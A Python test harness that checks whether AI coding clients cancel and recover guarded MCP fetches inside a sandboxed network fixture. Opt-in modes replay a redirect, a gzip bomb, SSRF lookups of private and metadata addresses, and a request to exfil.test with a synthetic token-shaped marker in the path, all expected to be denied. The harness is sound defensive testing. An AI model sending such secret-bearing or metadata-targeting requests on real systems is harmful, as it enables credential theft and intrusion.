#!/usr/bin/env python3
"""Opt-in authenticated client-control observations against route-free fixtures.

Usage: python3 tools/client_cancellation_probe.py claude|codex|cursor BINARY [SKILL_ZIP]
Requires existing client authentication and passwordless sudo for disposable netns.
Model inference may incur account usage; no credentials are read or printed.
This probes client control APIs, not desktop buttons or terminal Escape keys.
With SKILL_ZIP, set OUTBOUND_GUARD_CLIENT_TRAPS=1 to add controlled redirect
and compressed-body denials to the explicit native skill workflow.
Set OUTBOUND_GUARD_CLIENT_DNS_SSRF=1 for private, mixed-answer and metadata
DNS denials.
Set OUTBOUND_GUARD_CLIENT_EXFIL=1 for a synthetic secret-shaped URL denial.
Only one opt-in mode may be selected.
"""
import sys,os,json,pathlib,subprocess,tempfile,time,threading,queue,shutil,hashlib,atexit
assert len(sys.argv) in (3,4) and sys.argv[1] in ('claude','codex','cursor'), __doc__
skill_zip=pathlib.Path(sys.argv[3]).resolve(strict=True) if len(sys.argv)==4 else None
attack_mode=os.environ.get('OUTBOUND_GUARD_CLIENT_TRAPS')=='1'
dns_mode=os.environ.get('OUTBOUND_GUARD_CLIENT_DNS_SSRF')=='1'
exfil_mode=os.environ.get('OUTBOUND_GUARD_CLIENT_EXFIL')=='1'
assert sum((attack_mode,dns_mode,exfil_mode))<=1, 'choose one opt-in skill replay mode'
assert not (attack_mode or dns_mode or exfil_mode) or skill_zip, 'adversarial replay requires the explicit skill workflow'
synthetic_marker='ghp_'+'A'*20 if exfil_mode else None
binary=str(pathlib.Path(sys.argv[2]).resolve(strict=True))
script_dir=pathlib.Path(__file__).resolve().parent
root=pathlib.Path(tempfile.mkdtemp(prefix='outbound-cancel-'));root.chmod(0o700)
if exfil_mode:
 marker_file=root/'synthetic-marker'
 marker_file.write_text(synthetic_marker)
 marker_file.chmod(0o600)
ns='outbound-client-cancel-'+str(os.getpid())
(root/'namespace').write_text(ns)
skill_dir=root/({'claude':'.claude','cursor':'.cursor','codex':'.agents'}[sys.argv[1]]+'/skills/outbound-guard')
p = backend = None
owns_namespace = cleaned = False
def cleanup():
 global cleaned
 if cleaned:return
 cleaned=True
 if p is not None:
  try:
   if p.stdin and not p.stdin.closed:p.stdin.close()
   p.wait(timeout=4)
  except (subprocess.TimeoutExpired, BrokenPipeError):
   p.terminate()
   try:p.wait(timeout=4)
   except subprocess.TimeoutExpired:p.kill();p.wait()
 if owns_namespace:
  try:
   for pid in subprocess.check_output(['sudo','-n','ip','netns','pids',ns],text=True).split():
    subprocess.run(['sudo','-n','kill','-TERM',pid],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
  finally:
   subprocess.run(['sudo','-n','ip','netns','delete',ns],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
   subprocess.run(['sudo','-n','rm','-rf','--','/etc/netns/'+ns],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
 if backend is not None:
  try:backend.wait(timeout=4)
  except subprocess.TimeoutExpired:backend.terminate();backend.wait(timeout=4)
 shutil.rmtree(root)
atexit.register(cleanup)
if skill_zip:
 import zipfile
 with zipfile.ZipFile(skill_zip) as archive:
  assert sorted(archive.namelist())==['outbound-guard/LICENSE','outbound-guard/SKILL.md']
  skill_dir.mkdir(parents=True)
  for name in ('SKILL.md','LICENSE'):
   (skill_dir/name).write_bytes(archive.read('outbound-guard/'+name))


def sudo(*args,**kw):return subprocess.run(['sudo','-n',*args],check=True,stdout=subprocess.DEVNULL,**kw)
sudo('ip','netns','add',ns);owns_namespace=True
sudo('ip','-n',ns,'link','set','lo','up');sudo('ip','-n',ns,'address','add','11.0.0.1/32','dev','lo')
sudo('install','-d','-m','755','/etc/netns/'+ns)
sudo('tee','/etc/netns/'+ns+'/resolv.conf',input='nameserver 127.0.0.1\noptions timeout:1 attempts:1\n',text=True)
backend=subprocess.Popen(['sudo','-n','ip','netns','exec',ns,'python3','-B',str(script_dir/'client_cancellation_fixture.py'),str(root)],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
for _ in range(200):
 if (root/'ready').exists():break
 time.sleep(.02)
assert (root/'ready').exists() and backend.poll() is None, 'fixture startup failed'
bridge=[str(script_dir/'client_wire_bridge.py'),ns,binary,str(root/'wire.jsonl')]
if dns_mode:bridge.append('allowed.test,private.test,mixed.test,metadata.test')
if exfil_mode:bridge.append('allowed.test,exfil.test')
config=root/'mcp.json';config.write_text(json.dumps({'mcpServers':{'outbound_guard':{'command':'python3','args':bridge}}}))
(root/'.cursor').mkdir(exist_ok=True)
(root/'.cursor/mcp.json').write_text(config.read_text())
print('ROOT='+str(root),flush=True)
prompt='Use ONLY the outbound_guard guarded_fetch MCP tool to GET http://allowed.test/cancel-drip once. Do not use any other tools or retry. Wait for its actual result.'
clienthome=root/'codex';clienthome.mkdir(mode=0o700)
auth=pathlib.Path.home()/'.codex/auth.json'
if auth.exists():(clienthome/'auth.json').symlink_to(auth)
(clienthome/'config.toml').write_text('approval_policy="never"\nsandbox_mode="read-only"\n[mcp_servers.outbound_guard]\ncommand="python3"\nargs='+json.dumps(bridge)+'\nenabled_tools=["guarded_fetch"]\nrequired=true\n[mcp_servers.outbound_guard.tools.guarded_fetch]\napproval_mode="approve"\n')
name=sys.argv[1]
cmd=['claude','-p','--restricted','--strict-mcp-config','--mcp-config',str(config),'--allowedTools','mcp__outbound_guard__guarded_fetch','--tools','','--permission-mode','dontAsk','--no-session-persistence','--output-format','stream-json','--input-format','stream-json','--verbose'] if name=='claude' else ([str(pathlib.Path.home()/'.local/bin/agent'),'--approve-mcps','--trust','acp'] if name=='cursor' else ['codex','app-server','--listen','stdio://'])
if skill_zip and name=='claude':
 cmd.remove('--restricted')
 cmd.extend(['--setting-sources','project','--replay-user-messages'])
 cmd[cmd.index('--tools')+1]='Skill'
 cmd[cmd.index('--allowedTools')+1]='Skill(outbound-guard *),mcp__outbound_guard__guarded_fetch'
env=os.environ.copy()
if name=='codex':env['CODEX_HOME']=str(clienthome)
p=subprocess.Popen(cmd,cwd=root,env=env,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=open(root/'client.stderr','w'),text=True,bufsize=1)
q=queue.Queue()
def read():
 for line in p.stdout:
  with open(root/'client.jsonl','a') as f:f.write(line)
  try:
   message=json.loads(line)
   if message.get('method')=='session/request_permission':
    params=message['params'];allowed='guarded_fetch' in params['toolCall'].get('title','')
    kind='allow_once' if allowed else 'reject_once'
    option=next(x for x in params['options'] if x['kind']==kind)
    send({'jsonrpc':'2.0','id':message['id'],'result':{'outcome':{'outcome':'selected','optionId':option['optionId']}}})
   else:q.put(message)
  except ValueError:pass
send_lock=threading.Lock()
def send(m):
 with send_lock:
  p.stdin.write(json.dumps(m)+'\n');p.stdin.flush()
threading.Thread(target=read,daemon=True).start()
def response(id_):
 deadline=time.monotonic()+40
 while time.monotonic()<deadline:
  m=q.get(timeout=40)
  if m.get('id')==id_ and 'method' not in m:
   assert 'result' in m,m
   return m['result']
if skill_zip:
 try:
  skill_prompt='First invoke the outbound-guard skill using the Skill tool. Follow its instructions for this controlled fixture: use guarded_fetch to GET http://127.0.0.1/ once, GET http://allowed.test/plain once and HEAD http://allowed.test/head-ok once, in that order. The operator already approved allowed.test and installed the server. Use no other tools; report actual results.'
  expected_rules=['EGRESS_INVALID_HOST','EGRESS_ALLOWED','EGRESS_ALLOWED']
  expected_methods=['GET','GET','HEAD']
  if attack_mode:
   skill_prompt='First invoke the outbound-guard skill using the Skill tool. In this controlled fixture, use ONLY guarded_fetch for these five calls in order: GET http://127.0.0.1/ ; GET http://allowed.test/plain ; HEAD http://allowed.test/head-ok ; GET http://allowed.test/redirect ; GET http://allowed.test/gzip-bomb . Make every call once even when an earlier call is denied. Do not retry or use any other tool. The operator approved allowed.test and installed the server. Report the actual results.'
   expected_rules+=['EGRESS_REDIRECT_DENIED','EGRESS_ENCODED_RESPONSE']
   expected_methods+=['GET','GET']
  if dns_mode:
   skill_prompt='First invoke the outbound-guard skill using the Skill tool. In this disposable controlled DNS fixture, use ONLY guarded_fetch for these six calls in order: GET http://127.0.0.1/ ; GET http://allowed.test/plain ; HEAD http://allowed.test/head-ok ; GET http://private.test/plain ; GET http://mixed.test/plain ; GET http://metadata.test/plain . The operator approved all four exact DNS names for this negative security test. Make every call once even when an earlier call is denied. Do not retry or use any other tool. Report the actual results.'
   expected_rules+=['EGRESS_FORBIDDEN_ADDRESS']*3
   expected_methods+=['GET']*3
  if exfil_mode:
   skill_prompt='First invoke the outbound-guard skill using the Skill tool. In this disposable controlled fixture, use ONLY guarded_fetch for these four calls in order: GET http://127.0.0.1/ ; GET http://allowed.test/plain ; HEAD http://allowed.test/head-ok ; GET http://exfil.test/'+synthetic_marker+' . The last path is a synthetic test marker, not a real credential. The operator approved both exact DNS hosts for this negative test. Make every call once even when an earlier call is denied. Do not retry or use any other tool. Report the actual results.'
   expected_rules+=['EGRESS_SECRET_DETECTED']
   expected_methods+=['GET']
  if name=='claude':send({'type':'user','message':{'role':'user','content':skill_prompt}})
  elif name=='codex':
   send({'id':1,'method':'initialize','params':{'clientInfo':{'name':'outbound_skill_probe','version':'1'}}});response(1)
   send({'method':'initialized','params':{}})
   send({'id':20,'method':'skills/list','params':{'cwds':[str(root)],'forceReload':True}})
   listing=response(20)
   discovered=[s for entry in listing['data'] if entry['cwd']==str(root) for s in entry['skills'] if s['name']=='outbound-guard' and s.get('enabled') and s.get('path')==str(skill_dir/'SKILL.md')]
   assert len(discovered)==1,'native skill discovery did not return the installed enabled skill'
   assert not any(entry.get('errors') for entry in listing['data']),'native skill discovery returned errors'
   send({'id':2,'method':'thread/start','params':{'cwd':str(root),'approvalPolicy':'never','sandbox':'read-only','ephemeral':True}});tid=response(2)['thread']['id']
   skill_prompt=skill_prompt.replace('First invoke the outbound-guard skill using the Skill tool.', '$outbound-guard')
   send({'id':3,'method':'turn/start','params':{'threadId':tid,'input':[{'type':'text','text':skill_prompt},{'type':'skill','name':'outbound-guard','path':str(skill_dir/'SKILL.md')}]}});skill_turn=response(3)['turn']['id']
  else:
   skill_prompt=skill_prompt.replace('First invoke the outbound-guard skill using the Skill tool.', 'First discover and read the outbound-guard skill with native skill discovery.')
   send({'jsonrpc':'2.0','id':1,'method':'initialize','params':{'protocolVersion':1,'clientCapabilities':{}}});response(1)
   send({'jsonrpc':'2.0','id':2,'method':'session/new','params':{'cwd':str(root),'mcpServers':[{'name':'outbound_guard','command':'python3','args':bridge,'env':[]}]}});sid=response(2)['sessionId']
   send({'jsonrpc':'2.0','id':3,'method':'session/prompt','params':{'sessionId':sid,'prompt':[{'type':'text','text':skill_prompt}]}})

  deadline=time.monotonic()+80
  while time.monotonic()<deadline:
   events=[json.loads(line) for line in (root/'wire.jsonl').read_text().splitlines()] if (root/'wire.jsonl').exists() else []
   if [e.get('rule') for e in events if 'rule' in e]==expected_rules:break
   assert p.poll() is None,'client exited before skill workflow completed'
   time.sleep(.05)
  else:raise AssertionError('skill workflow did not complete expected tool calls')
  messages=[json.loads(line) for line in (root/'client.jsonl').read_text().rsplit('\n',1)[0].splitlines()]
  if name=='claude':
   blocks=[b for m in messages for b in m.get('message',{}).get('content',[]) if isinstance(b,dict)]
   invocations=[b for b in blocks if b.get('type')=='tool_use' and b.get('name')=='Skill' and b.get('input',{}).get('skill')=='outbound-guard']
   assert len(invocations)==1,'native Skill tool invocation not observed'
   results=[b for b in blocks if b.get('type')=='tool_result' and b.get('tool_use_id')==invocations[0]['id']]
   if not (len(results)==1 and not results[0].get('is_error')):
    print(json.dumps({'skill_diagnostic':{'result_count':len(results),'error_flags':[r.get('is_error') for r in results],
     'result_error_classes':[[word for word in ('permission','denied','unknown skill','not found','not allowed','restricted') if word in str(r.get('content','')).lower()] for r in results],
     'skill_arguments_present':bool(invocations[0].get('input',{}).get('args')),
     'message_types':sorted(set(m.get('type','unknown') for m in messages)),
     'project_path_seen':str(skill_dir) in json.dumps(messages)}}),flush=True)
   assert len(results)==1 and not results[0].get('is_error'), 'Skill tool result missing or failed'
   assert str(skill_dir) in json.dumps(messages), 'project skill source not observed in native transcript'
  elif name=='codex':
   deadline=time.monotonic()+40
   while time.monotonic()<deadline:
    messages=[json.loads(line) for line in (root/'client.jsonl').read_text().rsplit('\n',1)[0].splitlines()]
    completed=[m['params']['turn'] for m in messages if m.get('method')=='turn/completed' and m.get('params',{}).get('turn',{}).get('id')==skill_turn]
    if completed:break
    time.sleep(.05)
   assert completed and completed[0]['status']=='completed','native skill turn did not complete successfully'
  else:
   calls={}
   for message in messages:
    update=message.get('params',{}).get('update',{})
    if update.get('sessionUpdate') in ('tool_call','tool_call_update'):
     calls.setdefault(update['toolCallId'],{}).update(update)
   source=str(skill_dir/'SKILL.md')
   reads=[c for c in calls.values() if c.get('status')=='completed' and
          (source in json.dumps(c) or '.cursor/skills/outbound-guard/SKILL.md' in json.dumps(c)) and
          (c.get('kind')=='read' or 'read' in c.get('title','').lower())]
   if not reads:
    print(json.dumps({'skill_diagnostic':{'native_tool_kinds':[c.get('kind') for c in calls.values()],
     'native_tool_statuses':[c.get('status') for c in calls.values()],
     'skill_path_seen':source in json.dumps(messages)}}),flush=True)
   assert reads,'native project skill read not observed'
  if (attack_mode or dns_mode or exfil_mode) and name=='claude':
   deadline=time.monotonic()+40
   while time.monotonic()<deadline:
    messages=[json.loads(line) for line in (root/'client.jsonl').read_text().rsplit('\n',1)[0].splitlines()]
    if any(m.get('type')=='result' for m in messages):break
    time.sleep(.05)
   assert any(m.get('type')=='result' for m in messages), 'Claude skill turn did not complete'
  elif (attack_mode or dns_mode or exfil_mode) and name=='cursor':
   response(3)
  if attack_mode or dns_mode or exfil_mode:
   events=[json.loads(line) for line in (root/'wire.jsonl').read_text().splitlines()]
  fetches=[e for e in events if e.get('method')=='tools/call']
  if [e['http_method'] for e in fetches]!=expected_methods:
   print(json.dumps({'probe_diagnostic':{'http_methods':[e['http_method'] for e in fetches],
    'rules':[e['rule'] for e in events if 'rule' in e]}}),flush=True)
  assert [e['http_method'] for e in fetches]==expected_methods
  assert [e['status_code'] for e in events if 'status_code' in e]==[200,200]
  if attack_mode:
   expected_hits=['/plain','/head-ok','/redirect','/gzip-bomb']
   for _ in range(100):
    hits=json.loads((root/'hits.json').read_text())
    if hits==expected_hits:break
    time.sleep(.01)
   assert hits==expected_hits, hits
  if dns_mode:
   for _ in range(100):
    dns_names=json.loads((root/'dns.json').read_text())
    if set(dns_names)=={'private.test','mixed.test','metadata.test'}:break
    time.sleep(.01)
   assert set(dns_names)=={'private.test','mixed.test','metadata.test'}, dns_names
   hits=json.loads((root/'hits.json').read_text())
   assert hits==['/plain','/head-ok'], hits
  if exfil_mode:
   dns_names=json.loads((root/'dns.json').read_text())
   assert 'exfil.test' not in dns_names, dns_names
   hits=json.loads((root/'hits.json').read_text())
   assert hits==['/plain','/head-ok'], hits
   scanned=[e for e in events if e.get('direction')=='out' and 'synthetic_marker_echo' in e]
   if not scanned or any(e['synthetic_marker_echo'] for e in scanned):
    print(json.dumps({'marker_diagnostic':[{k:e.get(k) for k in ('id','method','rule','synthetic_marker_echo')}
     for e in scanned if e['synthetic_marker_echo']]}),flush=True)
   assert scanned and not any(e['synthetic_marker_echo'] for e in scanned), 'synthetic marker echoed in MCP result'
  print(json.dumps({'client':name,'native_skill_loaded':True,'native_skill_discovered':True if name=='codex' else None,'explicit_skill_input_accepted':True if name=='codex' else None,'native_turn_completed':True if name=='codex' else None,'native_skill_invoked':True if name=='claude' else None,
   'skill_tool_result_success':True if name=='claude' else None,'native_project_read_completed':True if name=='cursor' else None,
   'skill_zip_sha256':hashlib.sha256(skill_zip.read_bytes()).hexdigest(),
   'installed_skill_sha256':hashlib.sha256((skill_dir/'SKILL.md').read_bytes()).hexdigest(),
   'binary_sha256':hashlib.sha256(pathlib.Path(binary).read_bytes()).hexdigest(),
   'installation_scope':'temporary project '+str(skill_dir.relative_to(root)),
   'native_project_source_observed':True,'setting_sources':['project'] if name=='claude' else None,'builtin_tools':['Skill'] if name=='claude' else (['observed native read'] if name=='cursor' else None),
   'http_methods':[e['http_method'] for e in fetches], 'rules':[e['rule'] for e in events if 'rule' in e],
   'status_codes':[200,200], 'attack_mode':attack_mode, 'dns_mode':dns_mode, 'exfil_mode':exfil_mode,
   'fixture_hits':hits if (attack_mode or dns_mode or exfil_mode) else None,
   'forbidden_dns_names':sorted(set(dns_names)) if dns_mode else None,
   'exfil_dns_queried':'exfil.test' in dns_names if exfil_mode else None,
   'synthetic_marker_echo':False if exfil_mode else None,
   'scope':'explicit named skill request; Claude Skill tool, Cursor project read, or Codex discovered skill input and completed turn; not automatic trigger reliability or proof of model adherence'}),flush=True)
 finally:cleanup()
 sys.exit(0)
try:
 if name=='claude':send({'type':'user','message':{'role':'user','content':prompt}})
 elif name=='cursor':
  send({'jsonrpc':'2.0','id':1,'method':'initialize','params':{'protocolVersion':1,'clientCapabilities':{}}});response(1)
  send({'jsonrpc':'2.0','id':2,'method':'session/new','params':{'cwd':str(root),'mcpServers':[{'name':'outbound_guard','command':'python3','args':bridge,'env':[]}]}});sid=response(2)['sessionId']
  send({'jsonrpc':'2.0','id':3,'method':'session/prompt','params':{'sessionId':sid,'prompt':[{'type':'text','text':prompt}]}})
 else:
  send({'id':1,'method':'initialize','params':{'clientInfo':{'name':'outbound_cancel_probe','version':'1'}}});response(1)
  send({'method':'initialized','params':{}})
  send({'id':2,'method':'thread/start','params':{'cwd':str(root),'approvalPolicy':'never','sandbox':'read-only','ephemeral':True}})
  tid=response(2)['thread']['id']
  send({'id':3,'method':'turn/start','params':{'threadId':tid,'input':[{'type':'text','text':prompt}]}})
  turn=response(3)['turn']['id']
 start=time.monotonic()
 while not (root/'started').exists():
  assert p.poll() is None,'client exited'
  assert time.monotonic()-start<80,'fixture never started'
  time.sleep(.01)
 stop=time.monotonic()
 if name=='claude':send({'type':'control_request','request_id':'interrupt-probe','request':{'subtype':'interrupt'}})
 elif name=='cursor':send({'jsonrpc':'2.0','method':'session/cancel','params':{'sessionId':sid}})
 else:
  send({'id':4,'method':'turn/interrupt','params':{'threadId':tid,'turnId':turn}});response(4)
 for _ in range(200):
  if (root/'closed').exists():break
  time.sleep(.02)
 closed_after=round(time.monotonic()-stop,3)
 time.sleep(.2)
 if name=='codex':
  deadline=time.monotonic()+10
  while time.monotonic()<deadline:
   messages=[json.loads(line) for line in (root/'client.jsonl').read_text().rsplit('\n',1)[0].splitlines()]
   if any(m.get('method')=='turn/completed' and m.get('params',{}).get('turn',{}).get('id')==turn for m in messages):break
   time.sleep(.02)
 recovery='Use ONLY outbound_guard guarded_fetch to GET http://allowed.test/plain once. Report the actual result; no other tools.'
 if name=='claude':send({'type':'user','message':{'role':'user','content':recovery}})
 elif name=='cursor':
  response(3)
  send({'jsonrpc':'2.0','id':5,'method':'session/prompt','params':{'sessionId':sid,'prompt':[{'type':'text','text':recovery}]}})
 else:
  send({'id':5,'method':'turn/start','params':{'threadId':tid,'input':[{'type':'text','text':recovery}]}});recovery_turn=response(5)['turn']['id']
 deadline=time.monotonic()+40
 while time.monotonic()<deadline:
  lines=(root/'wire.jsonl').read_text().splitlines()
  if any(json.loads(line).get('rule')=='EGRESS_ALLOWED' for line in lines):break
  time.sleep(.02)
 smoke='Use ONLY outbound_guard guarded_fetch. First GET http://127.0.0.1/ once; then HEAD http://allowed.test/head-ok once. No other tools or retries. Report both actual results.'
 if name=='cursor':
  response(5)
  send({'jsonrpc':'2.0','id':6,'method':'session/prompt','params':{'sessionId':sid,'prompt':[{'type':'text','text':smoke}]}})
  response(6)
 elif name=='claude':send({'type':'user','message':{'role':'user','content':smoke}})
 else:
  deadline=time.monotonic()+40
  while time.monotonic()<deadline:
   messages=[json.loads(line) for line in (root/'client.jsonl').read_text().rsplit('\n',1)[0].splitlines()]
   if any(m.get('method')=='turn/completed' and m.get('params',{}).get('turn',{}).get('id')==recovery_turn for m in messages):break
   time.sleep(.02)
  else:raise AssertionError('recovery turn did not complete')
  send({'id':6,'method':'turn/start','params':{'threadId':tid,'input':[{'type':'text','text':smoke}]}});response(6)
 deadline=time.monotonic()+40
 while time.monotonic()<deadline:
  observed=[json.loads(line) for line in (root/'wire.jsonl').read_text().splitlines()]
  if len([e for e in observed if e.get('rule')=='EGRESS_ALLOWED'])==2:break
  time.sleep(.02)
 events=[json.loads(s) for s in (root/'wire.jsonl').read_text().splitlines()]
 cancels=[e for e in events if e.get('method')=='notifications/cancelled']
 fetches=[e for e in events if e.get('method')=='tools/call']
 matching=bool(cancels and cancels[0]['requestId']==fetches[0]['id'])
 cancelled_reply=any(e['direction']=='out' and e.get('id')==fetches[0]['id'] for e in events)
 if matching:assert not cancelled_reply, 'server replied after matching cancellation'
 if not any(e.get('rule')=='EGRESS_ALLOWED' for e in events):
  errors=[m.get('params',{}).get('error',{}).get('codexErrorInfo') for m in [json.loads(line) for line in (root/'client.jsonl').read_text().splitlines()] if m.get('method')=='error']
  print(json.dumps({'client_error_classes':errors}),flush=True)
 assert any(e.get('rule')=='EGRESS_ALLOWED' for e in events), 'recovery did not succeed'
 if name in ('claude','codex','cursor'):
  assert len(fetches)==4 and any(e.get('rule')=='EGRESS_INVALID_HOST' for e in events)
  assert fetches[-1]['http_method']=='HEAD' and [e.get('status_code') for e in events if e.get('rule')=='EGRESS_ALLOWED']==[200,200]
 assert (root/'closed').exists() and p.poll() is None
 messages=[json.loads(line) for line in (root/'client.jsonl').read_text().rsplit('\n',1)[0].splitlines()]
 if name=='claude':
  control_ack=any(m.get('type')=='control_response' and m.get('response',{}).get('request_id')=='interrupt-probe' and m['response'].get('subtype')=='success' for m in messages)
 elif name=='codex':
  control_ack=any(m.get('method')=='turn/completed' and m.get('params',{}).get('turn',{}).get('id')==turn and m['params']['turn'].get('status')=='interrupted' for m in messages)
 else:
  control_ack=any(m.get('id')==3 and m.get('result',{}).get('stopReason')=='cancelled' for m in messages)
 assert control_ack, 'client did not acknowledge interruption'
 report={'client':name,'binary_sha256':hashlib.sha256(pathlib.Path(binary).read_bytes()).hexdigest(),
         'control_path':{'claude':'stream-json interrupt','codex':'app-server turn/interrupt','cursor':'ACP session/cancel'}[name],
         'socket_closed':True,'live_client':True,'client_control_acknowledged':control_ack,'matching_wire_cancellation':matching,
         'cancelled_fetch_replied':cancelled_reply,'cancel_notifications':len(cancels),
         'http_methods':[e['http_method'] for e in fetches],
         'status_codes':[e['status_code'] for e in events if 'status_code' in e],
         'fetches':len(fetches),'socket_closed_after_seconds':closed_after,
         'recovery_allowed':True,'rules':[e['rule'] for e in events if 'rule' in e],
         'scope':'client control API, not desktop or terminal UI; no saturated input queue'}
 print(json.dumps(report),flush=True)
finally:
 cleanup()
